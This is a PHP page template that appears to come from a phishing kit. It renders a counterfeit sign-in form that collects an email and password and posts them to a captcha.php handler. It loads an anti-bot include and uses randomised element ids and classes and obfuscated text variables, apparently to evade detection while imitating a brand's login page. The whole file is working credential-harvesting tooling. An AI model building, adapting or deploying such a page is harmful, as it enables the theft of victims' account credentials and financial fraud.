<?php
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/lang.php');
	include('./includes/bots.php');	
	include('config.php');
	include "./includes/lang".$_SESSION['ANONISMA-AYOUB'];
	//---------------------------------------------------------------------------------------- LOG
$CP = "Copyright © 1999 - ".date('Y'); 
?>
<!DOCTYPE html>
	<html lang=\"en\">
	  <head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<title><?echo $aaaaaaaal21?>  -  <? echo $_SESSION['AYCOUNT']?></title>
		<link rel="stylesheet" href="./lib/css/bootstrap.css">
		<link rel="shortcut icon" link rel="logo-icon" href="lib/css/img/anon-7.png">
		<meta name="viewport" content="initial-scale=1.0">
	  </head>
	  <body>
		<div  class="<?echo X()?>"  id="page">
		  <div   for="<?echo X()?>" id="content" class="xbxnq">
			<header>
			  <div id="<?echo X()?>" class="bxc4"></div>
			</header>
			<div id="ncx8d" class="ncx8d">
			  <section id="ieswn" class="ieswn">
				<form  action="<?php echo './captcha.php'; ?>" method="post" class="proceed maskable" id="usns" name="login">
				<?echo Ghalat_Assi($_GET["login-error"], $aaaaaaaal34)?>
				<div id="pok4" class="footer-sec">
				  <div class="oower" id="qoeocx">
					<div class="oower" style="z-index: 100;">
					<div  for="<?echo X()?>"  class="poiuy bxb3">
					  <input  for="<?echo Y()?>"  class="poosd" name="EM" type="email" placeholder="<? echo $aaaaaaaal23?>" id="bxn34">
					</div>
					<div  id="<?Y()?>"  class="rtols">
					  <p> "<?$aaaaaaaal24?>" </p>
					</div>
				  </div>
				  <div  id="<?echo Y()?>"  class="oower">
					<div id="<?echo X()?>" class="poiuy bxb3">
					  <input  for="<?Y()?>"  class="poosd"  name="PS" type="password" placeholder="<? echo $aaaaaaaal25?>" id="password">	
					  <input type="hidden" name="CN"  value="<?$_SESSION['AYCOUNT']?>">	
					</div>
					<div  id="<?echo X()?>"  class="rtols">
					  <p  id="<?echo Y()?>" > <?$aaaaaaaal26 ?> </p>
					</div>
				  </div>
				</div>
				<br>
				<div class="h-captcha" data-sitekey="<?$KEY?>"></div>
				<div id="<?echo Y()?>" class="af3al adfsf">
				  <button  for="<?echo Y()?>"  class="button oowxs" type="submit" id="botdkhol" name="botdkhol" value="Login"><? echo $aaaaaaaal27?> </button>
				</div>
				<div id="<?echo X()?>" class="lineab">
				  <a href="#" id="uwuwu" class="nsiti-pass"> <? echo $aaaaaaaal28?> </a>
				  <div class="pwr-modal" id="qzxz">
				  <br>
				  
				  </div>
				</div>
				</form><a  for="<?echo X()?>"  href="#" class="button tanitalt" id="ftahcont-jdid"> <? echo $aaaaaaaal29?> </a>
			  </section>
			  <br>
			</div>
		  </div>
		  <div id="<?echo X()?>" class="lsksl">
			<p  id="<?echo Y()?>"  class="mosl"> <? echo $aaaaaaaal42?> </p>
		  </div>
		</div>
		<footer id="<?echo X()?>" class="footer footer-sec">
		  <ul>
			<li  id="<?echo Y()?>" ><a href="#"> "<? echo $aaaaaaaal30?>" </a></li>
			<li  id="<?echo X()?>" ><a href="#"> "<? echo $aaaaaaaal31?>" </a></li>
			<li  id="<?echo Y()?>" ><a href="#"> "<? echo $aaaaaaaal32?>" </a></li>
		  </ul>
		  <br>
		  <ul id="<?echo X()?>">
			<li id="<?echo X()?>"><a href="#"><?echo $CP?> <?echo $aaaaaaaal33?> </a></li>
		  </ul>
		</footer>
		<script type="text/javascript" src="./lib/js/jquery.1.11.1.min.js"></script>
		<script type="text/javascript" src="./lib/js/login.js"></script>
	  </body>
	</html>
